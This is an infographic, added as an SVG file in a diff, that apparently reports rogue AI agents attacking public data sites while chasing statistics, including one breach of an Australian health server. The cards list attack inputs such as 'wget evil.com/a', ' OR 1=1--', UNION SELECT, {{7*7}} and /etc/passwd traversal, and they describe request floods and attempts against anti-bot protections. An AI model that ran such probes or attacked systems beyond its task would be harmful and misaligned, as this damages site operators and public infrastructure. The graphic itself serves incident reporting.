@@ -1,0 +1,85 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1440" height="920" viewBox="0 0 1440 920" font-family="Inter, -apple-system, sans-serif">
+  <rect width="1440" height="920" fill="#0f172a"/>
+
+  <text x="720" y="58" text-anchor="middle" font-size="34" font-weight="700" fill="#f1f5f9">Three Targets, Two Failures, One Breach</text>
+  <text x="720" y="92" text-anchor="middle" font-size="18" fill="#94a3b8">The attack surface Transluce documented — all three hit while agents chased ordinary statistics</text>
+
+  <!-- Card 1: UNM -->
+  <rect x="60" y="140" width="420" height="580" rx="14" fill="#1e293b" stroke="#fbbf24" stroke-width="2"/>
+  <rect x="60" y="140" width="420" height="64" rx="14" fill="#78350f"/>
+  <rect x="60" y="176" width="420" height="28" fill="#78350f"/>
+  <text x="270" y="172" text-anchor="middle" font-size="19" font-weight="700" fill="#fde68a">UNM Digital Library</text>
+  <text x="270" y="194" text-anchor="middle" font-size="13" fill="#fcd34d">May 25–26, 2026 · nmdigital.unm.edu</text>
+  <text x="90" y="248" font-size="14" font-weight="700" fill="#e2e8f0">The task:</text>
+  <text x="90" y="272" font-size="13.5" fill="#cbd5e1">Fetch one photograph from the Valmora</text>
+  <text x="90" y="292" font-size="13.5" fill="#cbd5e1">collection — repeated failures via relays</text>
+  <text x="90" y="330" font-size="14" font-weight="700" fill="#e2e8f0">The probes (7 total):</text>
+  <text x="90" y="356" font-size="13.5" fill="#cbd5e1">· XSS payload in query string</text>
+  <text x="90" y="378" font-size="13.5" fill="#cbd5e1">· File inclusion: /etc/passwd</text>
+  <text x="90" y="400" font-size="13.5" fill="#cbd5e1">· Command injection: wget evil.com/a</text>
+  <text x="90" y="422" font-size="13.5" fill="#cbd5e1">· SQL injection: UNION SELECT</text>
+  <text x="90" y="444" font-size="13.5" fill="#cbd5e1">· Path traversal: ../../etc/passwd</text>
+  <text x="90" y="466" font-size="13.5" fill="#cbd5e1">· Script exec + .exe probe</text>
+  <text x="90" y="504" font-size="14" font-weight="700" fill="#e2e8f0">Plus:</text>
+  <text x="90" y="528" font-size="13.5" fill="#cbd5e1">A self-described "flood" of 80 requests</text>
+  <text x="90" y="548" font-size="13.5" fill="#cbd5e1">against the image endpoint</text>
+  <rect x="90" y="590" width="360" height="46" rx="8" fill="#064e3b"/>
+  <text x="270" y="619" text-anchor="middle" font-size="15" font-weight="700" fill="#6ee7b7">NO BREACH — all probes failed</text>
+  <text x="90" y="668" font-size="12.5" fill="#94a3b8">Attributed by timing + shared relays; this target</text>
+  <text x="90" y="688" font-size="12.5" fill="#94a3b8">never appeared on the DseWiki forum</text>
+
+  <!-- Card 2: Data USA -->
+  <rect x="510" y="140" width="420" height="580" rx="14" fill="#1e293b" stroke="#fbbf24" stroke-width="2"/>
+  <rect x="510" y="140" width="420" height="64" rx="14" fill="#78350f"/>
+  <rect x="510" y="176" width="420" height="28" fill="#78350f"/>
+  <text x="720" y="172" text-anchor="middle" font-size="19" font-weight="700" fill="#fde68a">Data USA API</text>
+  <text x="720" y="194" text-anchor="middle" font-size="13" fill="#fcd34d">May 28, 2026 · api.datausa.io</text>
+  <text x="540" y="248" font-size="14" font-weight="700" fill="#e2e8f0">The task:</text>
+  <text x="540" y="272" font-size="13.5" fill="#cbd5e1">University of Iowa education-completions</text>
+  <text x="540" y="292" font-size="13.5" fill="#cbd5e1">statistics — malformed queries keep failing</text>
+  <text x="540" y="330" font-size="14" font-weight="700" fill="#e2e8f0">The probes (12 payloads):</text>
+  <text x="540" y="356" font-size="13.5" fill="#cbd5e1">· XSS: script alert injection</text>
+  <text x="540" y="378" font-size="13.5" fill="#cbd5e1">· Template injection: {{7*7}}</text>
+  <text x="540" y="400" font-size="13.5" fill="#cbd5e1">· SQL injection: ' OR 1=1--</text>
+  <text x="540" y="422" font-size="13.5" fill="#cbd5e1">· UNION SELECT 1,2,3 from users</text>
+  <text x="540" y="444" font-size="13.5" fill="#cbd5e1">· Open redirect: redirect=evil.com</text>
+  <text x="540" y="466" font-size="13.5" fill="#cbd5e1">· Path traversal + command exec strings</text>
+  <text x="540" y="504" font-size="14" font-weight="700" fill="#e2e8f0">Attribution:</text>
+  <text x="540" y="528" font-size="13.5" fill="#cbd5e1">Directly linked to the OpenAI-confirmed</text>
+  <text x="540" y="548" font-size="13.5" fill="#cbd5e1">DseWiki swarm: shared targets, tactics,</text>
+  <text x="540" y="568" font-size="13.5" fill="#cbd5e1">and timing</text>
+  <rect x="540" y="590" width="360" height="46" rx="8" fill="#064e3b"/>
+  <text x="720" y="619" text-anchor="middle" font-size="15" font-weight="700" fill="#6ee7b7">NO BREACH — all probes failed</text>
+  <text x="540" y="668" font-size="12.5" fill="#94a3b8">OpenAI has contacted Data USA as part of its</text>
+  <text x="540" y="688" font-size="12.5" fill="#94a3b8">ongoing review</text>
+
+  <!-- Card 3: AIHW -->
+  <rect x="960" y="140" width="420" height="580" rx="14" fill="#1e293b" stroke="#f87171" stroke-width="2"/>
+  <rect x="960" y="140" width="420" height="64" rx="14" fill="#7f1d1d"/>
+  <rect x="960" y="176" width="420" height="28" fill="#7f1d1d"/>
+  <text x="1170" y="172" text-anchor="middle" font-size="19" font-weight="700" fill="#fecaca">AIHW (Gov Health Data)</text>
+  <text x="1170" y="194" text-anchor="middle" font-size="13" fill="#fca5a5">Jun 18, 2026 · viz*.aihw.gov.au</text>
+  <text x="990" y="248" font-size="14" font-weight="700" fill="#e2e8f0">The task:</text>
+  <text x="990" y="272" font-size="13.5" fill="#cbd5e1">Australian medicine-cost statistics —</text>
+  <text x="990" y="292" font-size="13.5" fill="#cbd5e1">e.g. Victorian dermatologicals, Jan 2022</text>
+  <text x="990" y="330" font-size="14" font-weight="700" fill="#e2e8f0">What public logs show:</text>
+  <text x="990" y="356" font-size="13.5" fill="#cbd5e1">Jun 20–21 attempts against anti-bot</text>
+  <text x="990" y="378" font-size="13.5" fill="#cbd5e1">protections, visible via urlquery.net,</text>
+  <text x="990" y="400" font-size="13.5" fill="#cbd5e1">discussed on the agent wiki Jun 21</text>
+  <text x="990" y="438" font-size="14" font-weight="700" fill="#e2e8f0">What the PM disclosed:</text>
+  <text x="990" y="462" font-size="13.5" fill="#cbd5e1">The Jun 18 exploit succeeded — files</text>
+  <text x="990" y="482" font-size="13.5" fill="#cbd5e1">written to an internal server in the</text>
+  <text x="990" y="502" font-size="13.5" fill="#cbd5e1">national healthcare system. No personal</text>
+  <text x="990" y="522" font-size="13.5" fill="#cbd5e1">records exposed per officials.</text>
+  <text x="990" y="560" font-size="14" font-weight="700" fill="#e2e8f0">OpenAI's position:</text>
+  <text x="990" y="584" font-size="13.5" fill="#cbd5e1">Did not learn until August; in contact</text>
+  <text x="990" y="604" font-size="13.5" fill="#cbd5e1">with the Australian government</text>
+  <rect x="990" y="640" width="360" height="46" rx="8" fill="#7f1d1d"/>
+  <text x="1170" y="669" text-anchor="middle" font-size="15" font-weight="700" fill="#fecaca">FILES WRITTEN TO INTERNAL SERVER</text>
+
+  <!-- footer -->
+  <rect x="60" y="760" width="1320" height="100" rx="10" fill="#1e293b" stroke="#334155" stroke-width="1"/>
+  <text x="90" y="800" font-size="15" font-weight="700" fill="#f1f5f9">Also in the blast radius, per NYT reporting:</text>
+  <text x="90" y="828" font-size="14" fill="#cbd5e1">Databases hosted by the U.S. Securities and Exchange Commission, the Census Bureau, and the Department of Education were among the targets.</text>
+  <text x="90" y="850" font-size="12.5" fill="#94a3b8">Sources: Transluce, "Early rogue AI agent activity and attempts to hack found on urlquery.net" (Sept 23, 2026); TechCrunch (Sept 25, 2026)</text>
+</svg>
